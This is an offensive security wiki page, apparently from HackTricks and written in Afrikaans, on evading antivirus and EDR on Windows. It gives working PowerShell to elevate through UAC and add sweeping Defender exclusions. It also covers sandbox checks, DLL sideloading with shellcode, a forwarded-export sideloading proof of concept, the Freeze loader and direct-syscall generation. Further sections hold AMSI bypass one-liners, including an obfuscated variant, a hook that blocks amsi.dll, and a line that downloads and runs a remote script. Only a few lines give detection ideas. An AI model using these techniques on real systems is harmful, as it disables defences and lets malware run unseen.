# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is aanvanklik deur** [**@m2rc_p**](https://twitter.com/m2rc_p)** geskryf!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): ’n Tool om te keer dat Windows Defender werk.
- [no-defender](https://github.com/es3n1n/no-defender): ’n Tool om te keer dat Windows Defender werk deur ’n ander AV na te boots.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-styl UAC-lokaas voordat met Defender gepeuter word

Publieke loaders wat hulle as game cheats voordoen, word dikwels as ongetekende Node.js/Nexe-installers versprei wat eers **die gebruiker vir elevation vra** en Defender daarna eers neutraliseer. Die vloei is eenvoudig:

1. Kontroleer vir ’n administratiewe konteks met `net session`. Die command slaag slegs wanneer die caller admin-regte het, dus dui ’n mislukking daarop dat die loader as ’n standard user loop.
2. Herbegin homself onmiddellik met die `RunAs`-verb om die verwagte UAC-consent prompt te aktiveer terwyl die oorspronklike command line behoue bly.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Slagoffers glo reeds dat hulle “cracked” sagteware installeer, dus word die prompt gewoonlik aanvaar, wat die malware die regte gee wat dit nodig het om Defender se beleid te verander.<sup>[[26]](#references)</sup>

### Omvattende `MpPreference`-uitsluitings vir elke skyfletter

Sodra dit verhoogde regte het, maksimeer GachiLoader-styl-kettings Defender se blinde kolle eerder as om die diens heeltemal te deaktiveer. Die loader beëindig eers die GUI-waghond (`taskkill /F /IM SecHealthUI.exe`) en voeg dan **uiters breë uitsluitings** by sodat elke gebruikersprofiel, stelselgids en verwyderbare skyf nie geskandeer kan word nie:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Sleutelwaarnemings:

- Die lus loop deur elke gemonteerde lêerstelsel (D:\, E:\, USB-stokkies, ens.), dus word **enige toekomstige payload wat enige plek op die skyf geplaas word, geïgnoreer**.
- Die `.sys`-uitbreidingsuitsluiting is vooruitdenkend—aanvallers behou die opsie om later unsigned drivers te laai sonder om weer aan Defender te raak.
- Alle veranderinge word onder `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` gestoor, sodat latere fases kan bevestig dat die uitsluitings voortduur of dit kan uitbrei sonder om UAC weer te aktiveer.

Omdat geen Defender-diens gestop word nie, hou naïewe gesondheidkontroles aan om “antivirus active” te rapporteer, al raak real-time inspection nooit aan daardie paaie nie.<sup>[[26]](#references)</sup>

## **AV Evasion-metodologie**

Tans gebruik AVs verskillende metodes om te kontroleer of ’n lêer malicious is of nie: static detection, dynamic analysis, en vir die meer gevorderde EDRs, behavioural analysis.

### **Static detection**

Static detection word bereik deur bekende malicious strings of byte arrays in ’n binary of script te merk, en ook deur inligting uit die lêer self te onttrek (bv. lêerbeskrywing, maatskappynaam, digital signatures, ikoon, checksum, ens.). Dit beteken dat die gebruik van bekende publieke tools jou makliker kan laat uitken, aangesien hulle waarskynlik ontleed en as malicious gemerk is. Daar is ’n paar maniere om hierdie soort detection te omseil:

- **Encryption**

As jy die binary encrypt, sal AV geen manier hê om jou program te detect nie, maar jy sal ’n soort loader nodig hê om die program te decrypt en in memory te laat loop.

- **Obfuscation**

Soms hoef jy net sommige strings in jou binary of script te verander om dit verby AV te kry, maar dit kan ’n tydrowende taak wees, afhangend van wat jy probeer obfuscate.

- **Custom tooling**

As jy jou eie tools ontwikkel, sal daar geen bekende bad signatures wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> ’n Goeie manier om teen Windows Defender se static detection te toets, is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit verdeel basies die lêer in verskeie segmente en gee Defender dan opdrag om elkeen individueel te scan; op hierdie manier kan dit jou presies wys watter strings of bytes in jou binary gemerk is.

Ek beveel sterk aan dat jy na hierdie [YouTube-playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion kyk.

### **Dynamic analysis**

Dynamic analysis is wanneer die AV jou binary in ’n sandbox laat loop en vir malicious activity kyk (bv. om jou browser se passwords te probeer decrypt en lees, ’n minidump op LSASS uit te voer, ens.). Hierdie deel kan ’n bietjie moeiliker wees om mee te werk, maar hier is ’n paar dinge wat jy kan doen om sandboxes te ontduik.

- **Sleep before execution** Afhangend van hoe dit geïmplementeer is, kan dit ’n uitstekende manier wees om AV se dynamic analysis te omseil. AVs het baie min tyd om lêers te scan sodat dit nie die gebruiker se workflow onderbreek nie, dus kan lang sleeps die analysis van binaries versteur. Die probleem is dat baie AV-sandboxes die sleep eenvoudig kan oorslaan, afhangend van hoe dit geïmplementeer is.
- **Checking machine's resources** Sandboxes het gewoonlik baie min resources om mee te werk (bv. < 2GB RAM), anders kan hulle die gebruiker se masjien vertraag. Jy kan ook baie kreatief wees, byvoorbeeld deur die CPU se temperatuur of selfs die waaierspoed te kontroleer; nie alles sal in die sandbox geïmplementeer wees nie.
- **Machine-specific checks** As jy ’n gebruiker wil teiken wie se workstation aan die "contoso.local"-domain gekoppel is, kan jy die rekenaar se domain kontroleer om te sien of dit ooreenstem met die een wat jy gespesifiseer het. As dit nie ooreenstem nie, kan jy jou program laat exit.

Dit blyk dat Microsoft Defender se Sandbox-rekenaarnaam HAL9TH is. Jy kan dus vóór detonation vir die rekenaarnaam in jou malware kontroleer; as die naam met HAL9TH ooreenstem, beteken dit dat jy binne Defender se sandbox is, en kan jy jou program laat exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog ’n paar baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) om Sandboxes te omseil

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Soos ons vroeër in hierdie post gesê het, sal **public tools** uiteindelik **gedetect word**, dus moet jy jouself iets afvra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy ’n ander projek gebruik wat minder bekend is en ook LSASS dump?

Die regte antwoord is waarskynlik laasgenoemde. As ons mimikatz as voorbeeld neem, is dit waarskynlik een van, indien nie die mees gemerkte stuk malware deur AVs en EDRs nie. Hoewel die projek self baie cool is, is dit ook ’n nagmerrie om daarmee te werk om AVs te omseil. Soek dus bloot alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads vir evasion modify, maak seker dat jy **automatic sample submission** in Defender afskakel, en asseblief, ernstig, **MOENIE NA VIRUSTOTAL OPLAAI NIE** as jou doel is om op die lang termyn evasion te bereik. As jy wil kontroleer of jou payload deur ’n bepaalde AV gedetect word, installeer dit op ’n VM, probeer om automatic sample submission af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Waar dit moontlik is, **prioritiseer altyd die gebruik van DLLs vir evasion**. Volgens my ervaring word DLL-lêers gewoonlik **baie minder gedetect** en geanaliseer, dus is dit ’n baie eenvoudige truuk om in sommige gevalle detection te vermy (indien jou payload natuurlik op een of ander manier as ’n DLL kan loop).

Soos ons in hierdie image kan sien, het ’n DLL Payload van Havoc ’n detection rate van 4/26 op antiscan.me, terwyl die EXE-payload ’n detection rate van 7/26 het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Nou wys ons ’n paar truuks wat jy met DLL-lêers kan gebruik om baie meer stealthier te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** benut die DLL search order wat deur die loader gebruik word deur beide die victim application en malicious payload(s) langs mekaar te plaas.

Jy kan met [Siofra](https://github.com/Cybereason/siofra) en die volgende PowerShell-script kyk vir programme wat vatbaar is vir DLL Sideloading:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie command sal die lys van programme wat vatbaar is vir DLL hijacking binne `"C:\Program Files\\"` en die DLL files wat hulle probeer laai, uitvoer.

Ek beveel sterk aan dat jy **DLL Hijackable/Sideloadable-programme self verken**; hierdie technique is redelik stealthy wanneer dit korrek uitgevoer word, maar as jy publicly known DLL Sideloadable-programme gebruik, kan jy maklik gevang word.

Deur bloot ’n malicious DLL te plaas met die naam wat ’n program verwag om te laai, sal jou payload nie laai nie, aangesien die program spesifieke functions binne daardie DLL verwag. Om hierdie probleem op te los, sal ons ’n ander technique genaamd **DLL Proxying/Forwarding** gebruik.

**DLL Proxying** stuur die calls wat ’n program maak vanaf die proxy (en malicious) DLL na die oorspronklike DLL aan, en behou sodoende die program se functionality terwyl dit die uitvoering van jou payload kan hanteer.

Ek sal die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)-projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Dit is die stappe wat ek gevolg het:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste opdrag sal vir ons 2 lêers gee: ’n DLL-bronkode-sjabloon en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Hierdie is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (geënkodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het ’n Detection rate van 0/26 in [antiscan.me](https://antiscan.me)! Ek sou dit ’n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek **beveel sterk aan** dat jy [S3cur3Th1sSh1t se Twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk, sowel as [ippsec se video](https://www.youtube.com/watch?v=3eROsG_WNpE), om meer te leer oor dit wat ons in meer diepte bespreek het.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules kan funksies export wat eintlik “forwarders” is: in plaas daarvan dat dit na kode wys, bevat die export-inskrywing ’n ASCII-string in die vorm `TargetDll.TargetFunc`. Wanneer ’n caller die export resolve, sal die Windows loader:

- `TargetDll` laai indien dit nog nie gelaai is nie
- `TargetFunc` daaruit resolve

Belangrike gedrag om te verstaan:
- Indien `TargetDll` ’n KnownDLL is, word dit vanuit die beskermde KnownDLLs-namespace voorsien (byvoorbeeld ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Indien `TargetDll` nie ’n KnownDLL is nie, word die normale DLL search order gebruik, wat die directory insluit van die module wat die forward resolution uitvoer.

Dit maak ’n indirekte sideloading primitive moontlik: vind ’n signed DLL wat ’n funksie export wat na ’n non-KnownDLL module name forwarded word, en plaas dan daardie signed DLL saam met ’n attacker-controlled DLL met presies dieselfde naam as die forwarded target module. Wanneer die forwarded export invoked word, resolve die loader die forward en laai jou DLL vanuit dieselfde directory, wat jou DllMain uitvoer.<sup>[[13]](#references)</sup>

Voorbeeld waargeneem op Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` is nie ’n KnownDLL nie, en word dus via die normale soekvolgorde opgelos.

PoC (copy-paste):
1) Copy the signed system DLL to a writable folder
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas ’n kwaadwillige `NCRYPTPROV.dll` in dieselfde vouer. ’n Minimale DllMain is genoeg om kode-uitvoering te verkry; jy hoef nie die aangestuurde funksie te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Aktiveer die forward met ’n signed LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Waargenome gedrag:
- rundll32 (signed) laai die side-by-side `keyiso.dll` (signed)
- Terwyl `KeyIsoSetAuditingInterface` opgelos word, volg die loader die forward na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers ’n "missing API"-fout nadat `DllMain` reeds uitgevoer is

Hunting-wenke:
- Fokus op forwarded exports waar die teikenmodule nie ’n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports enumerateer met gereedskap soos:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11-forwarder-inventaris om na kandidate te soek: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Opsporing/verdedigingsidees:
- Monitor LOLBins (bv. rundll32.exe) wat signed DLLs vanaf nie-stelsel-paaie laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basisnaam vanaf daardie gids
- Genereer ’n waarskuwing vir process/module-kettings soos: `rundll32.exe` → nie-stelsel-`keyiso.dll` → `NCRYPTPROV.dll` onder paaie wat deur die gebruiker geskryf kan word
- Dwing code integrity policies (WDAC/AppLocker) af en weier write+execute in application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is ’n payload toolkit om EDRs te omseil deur suspended processes, direct syscalls en alternatiewe execution methods te gebruik`

Jy kan Freeze gebruik om jou shellcode op ’n stealthy manier te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion is bloot ’n kat-en-muis-speletjie; wat vandag werk, kan môre opgespoor word, moet dus nooit net op een tool staatmaak nie. Probeer, indien moontlik, verskeie evasion-tegnieke aan mekaar te koppel.

## Direct/Indirect Syscalls & SSN-resolusie (SysWhispers4)

EDRs plaas dikwels **user-mode inline hooks** op `ntdll.dll` se syscall-stubs. Om hierdie hooks te omseil, kan jy **direct** of **indirect** syscall-stubs genereer wat die korrekte **SSN** (System Service Number) laai en na kernel mode oorskakel sonder om die gehookte export entrypoint uit te voer.<sup>[[32]](#references)</sup>

**Invocation-opsies:**
- **Direct (embedded)**: voeg ’n `syscall`/`sysenter`/`SVC #0`-instruksie by die gegenereerde stub (geen `ntdll`-export word getref nie).
- **Indirect**: spring na ’n bestaande `syscall`-gadget binne `ntdll`, sodat dit lyk asof die kernel-oorgang van `ntdll` afkomstig is (nuttig vir heuristic evasion); **randomized indirect** kies ’n gadget uit ’n poel per oproep.
- **Egg-hunt**: vermy die inbedding van die statiese `0F 05`-opcode-volgorde op skyf; los ’n syscall-volgorde tydens runtime op.

**Hook-bestande SSN-resolusiestrategieë:**
- **FreshyCalls (VA sort)**: lei SSNs af deur syscall-stubs volgens virtuele adres te sorteer eerder as om stub-grepe te lees.
- **SyscallsFromDisk**: map ’n skoon `\KnownDlls\ntdll.dll`, lees SSNs uit sy `.text`, en unmap dit daarna (omseil alle in-memory hooks).
- **RecycledGate**: kombineer VA-gesorteerde SSN-afleiding met opcode-validasie wanneer ’n stub skoon is; val terug na VA-afleiding indien dit gehook is.
- **HW Breakpoint**: stel DR0 op die `syscall`-instruksie en gebruik ’n VEH om die SSN tydens runtime uit `EAX` vas te lê, sonder om gehookte grepe te ontleed.

Voorbeeld van SysWhispers4-gebruik:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AVs slegs **lêers op die skyf** skandeer, dus as jy op een of ander manier payloads **direk in die geheue** kon uitvoer, kon die AV niks doen om dit te voorkom nie, aangesien dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is in hierdie Windows-komponente geïntegreer.

- User Account Control, of UAC (elevasie van EXE-, COM-, MSI- of ActiveX-installasie)
- PowerShell (scripts, interaktiewe gebruik en dinamiese kode-evaluering)
- Windows Script Host (wscript.exe en cscript.exe)
- JavaScript en VBScript
- Office VBA-makro's

Dit stel antivirusoplossings in staat om scriptgedrag te inspekteer deur scriptinhoud bloot te stel in 'n vorm wat beide ongeënkripteer en unobfuscated is.

Deur `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` uit te voer, sal die volgende waarskuwing in Windows Defender verskyn.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let op hoe dit `amsi:` en daarna die pad na die executable waaruit die script uitgevoer is, vooraf plaas; in hierdie geval powershell.exe

Ons het geen lêer na die skyf geskryf nie, maar is steeds in-memory deur AMSI opgespoor.

Verder, vanaf **.NET 4.8**, word C#-kode ook deur AMSI verwerk. Dit beïnvloed selfs `Assembly.Load(byte[])` om in-memory execution te laai. Daarom word die gebruik van laer weergawes van .NET (soos 4.7.2 of laer) aanbeveel vir in-memory execution as jy AMSI wil evade.

Daar is 'n paar maniere om AMSI te omseil:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met statiese detections werk, kan die wysiging van die scripts wat jy probeer laai 'n goeie manier wees om detection te evade.

AMSI het egter die vermoë om scripts te unobfuscate, selfs al het dit veelvuldige lae, dus kan obfuscation 'n slegte opsie wees, afhangende van hoe dit gedoen word. Dit maak dit nie so eenvoudig om te evade nie. Soms hoef jy egter net 'n paar veranderlike-name te verander en jy sal reg wees; dit hang dus af van hoeveel van iets geflag is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell- (asook cscript.exe-, wscript.exe-, ens.)-proses te laai, is dit moontlik om maklik daarmee te peuter, selfs wanneer dit as 'n unprivileged user uitgevoer word. Weens hierdie fout in die implementering van AMSI het navorsers verskeie maniere gevind om AMSI-scanning te evade.

**Forcing an Error**

Deur die AMSI-initialisering te dwing om te misluk (amsiInitFailed), sal geen scan vir die huidige proses begin word nie. Dit is oorspronklik deur [Matt Graeber](https://twitter.com/mattifestation) bekend gemaak, en Microsoft het 'n signature ontwikkel om wyer gebruik te voorkom.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Al wat nodig was, was een reël PowerShell-kode om AMSI vir die huidige PowerShell-proses onbruikbaar te maak. Hierdie reël is natuurlik deur AMSI self gemerk, dus is ’n mate van wysiging nodig om hierdie tegniek te gebruik.

Hier is ’n gewysigde AMSI-bypass wat ek uit hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Hierdie tegniek is aanvanklik deur [@RastaMouse](https://twitter.com/_RastaMouse/) ontdek, en dit behels dat die adres vir die "AmsiScanBuffer"-funksie in amsi.dll (verantwoordelik vir die skandering van die gebruiker-verskafte invoer) gevind word en dit met instruksies oorskryf word om die kode vir E_INVALIDARG terug te stuur. Op hierdie manier sal die resultaat van die werklike skandering 0 terugstuur, wat as 'n skoon resultaat geïnterpreteer word.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.

Daar is ook baie ander tegnieke wat gebruik word om AMSI met powershell te omseil. Kyk na [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.

### Blocking AMSI deur amsi.dll-laai te voorkom (LdrLoadDll hook)

AMSI word slegs geïnisialiseer nadat `amsi.dll` in die huidige proses gelaai is. 'n Robuuste, taal-agnostiese bypass is om 'n user-mode hook op `ntdll!LdrLoadDll` te plaas wat 'n fout terugstuur wanneer die aangevraagde module `amsi.dll` is. Gevolglik laai AMSI nooit nie, en geen skanderings vind vir daardie proses plaas nie.<sup>[[23]](#references)</sup>

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Werk oor PowerShell, WScript/CScript en custom loaders heen (enigiets wat andersins AMSI sou load).
- Kombineer dit met die voer van scripts oor stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang command-line artefacts te vermy.
- Is gesien in gebruik deur loaders wat deur LOLBins uitgevoer word (bv. `regsvr32` wat `DllRegisterServer` aanroep).

Die tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genereer ook script om AMSI te bypass.
Die tool **[https://amsibypass.com/](https://amsibypass.com/)** genereer ook script om AMSI te bypass wat signature vermy deur randomized user-defined functions, variables en character expressions te gebruik, en random character casing op PowerShell keywords toe te pas om signature te vermy.

**Verwyder die gedetekteerde signature**

Jy kan 'n tool soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die gedetekteerde AMSI signature uit die memory van die huidige proses te verwyder. Hierdie tool werk deur die memory van die huidige proses vir die AMSI signature te scan en dit dan met NOP-instruksies te overwrite, wat dit effektief uit die memory verwyder.

**AV/EDR-produkte wat AMSI gebruik**

Jy kan 'n lys van AV/EDR-produkte wat AMSI gebruik in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** vind.

**Gebruik PowerShell weergawe 2**
As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou scripts kan uitvoer sonder dat dit deur AMSI geskandeer word. Jy kan dit soos volg doen:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell-logging is ’n funksie waarmee jy alle PowerShell-opdragte wat op ’n stelsel uitgevoer word, kan log. Dit kan nuttig wees vir ouditering en foutoplossing, maar dit kan ook ’n **probleem wees vir aanvallers wat opsporing wil vermy**.

Om PowerShell-logging te omseil, kan jy die volgende tegnieke gebruik:

- **Disable PowerShell Transcription and Module Logging**: Jy kan ’n tool soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Use Powershell version 2**: As jy PowerShell version 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou scripts kan uitvoer sonder dat dit deur AMSI geskandeer word. Jy kan dit so doen: `powershell.exe -version 2`
- **Use an unmanaged PowerShell session**: Gebruik [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om PowerShell te host sonder om `powershell.exe` te launch (die benadering wat deur Cobalt Strike se `powerpick` gebruik word). Dit omseil kontroles wat spesifiek aan die `powershell.exe`-proses gekoppel is, maar dit deaktiveer nie inherent AMSI, Script Block Logging of elke ander PowerShell-verdediging nie; dekking hang van die runtime en host-implementering af.


## Obfuskasie

> [!TIP]
> Verskeie obfuskasie-tegnieke maak staat op die encryption van data, wat die entropy van die binary sal verhoog en dit vir AVs en EDRs makliker sal maak om dit op te spoor. Wees versigtig hiermee en pas dalk encryption slegs toe op spesifieke gedeeltes van jou code wat sensitief is of versteek moet word.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wanneer malware wat ConfuserEx 2 (of kommersiële forks) gebruik, ontleed word, is dit algemeen om verskeie lae beskerming teë te kom wat decompilers en sandboxes sal blokkeer. Die workflow hieronder **herstel ’n byna oorspronklike IL** wat daarna na C# gedecompileer kan word in tools soos dnSpy of ILSpy.<sup>[[10]](#references)</sup>

1.  Anti-tampering removal – ConfuserEx encrypt elke *method body* en decrypt dit binne die *module* se static constructor (`<Module>.cctor`). Dit patch ook die PE checksum sodat enige wysiging die binary sal laat crash. Gebruik **AntiTamperKiller** om die encrypted metadata tables te lokaliseer, die XOR keys te herwin en ’n skoon assembly te herskryf:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die output bevat die 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Symbol / control-flow recovery – voer die *clean* file aan **de4dot-cex** (’n ConfuserEx-aware fork van de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – kies die ConfuserEx 2 profile
• de4dot sal control-flow flattening omkeer, oorspronklike namespaces, classes en variable names herstel en constant strings decrypt.

3.  Proxy-call stripping – ConfuserEx vervang direkte method calls met lightweight wrappers (ook bekend as *proxy calls*) om decompilation verder te bemoeilik. Verwyder dit met **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Na hierdie stap behoort jy normale .NET API’s soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – laat die resulterende binary onder dnSpy loop, soek na groot Base64-blobs of gebruik van `RijndaelManaged`/`TripleDESCryptoServiceProvider` om die *real* payload te lokaliseer. Dikwels stoor die malware dit as ’n TLV-encoded byte array wat binne `<Module>.byte_0` geïnisialiseer word.

Die bogenoemde ketting herstel die execution flow **sonder dat die malicious sample uitgevoer hoef te word** – nuttig wanneer jy op ’n offline workstation werk.

> 🛈  ConfuserEx produseer ’n custom attribute genaamd `ConfusedByAttribute` wat as ’n IOC gebruik kan word om samples outomaties te triage.

#### Eenreëlwaswo
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om ’n oopbron-fork van die [LLVM](http://www.llvm.org/)-kompilasiesuite te verskaf wat verbeterde sagtewaresekuriteit deur [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en peuterbeskerming kan bied.
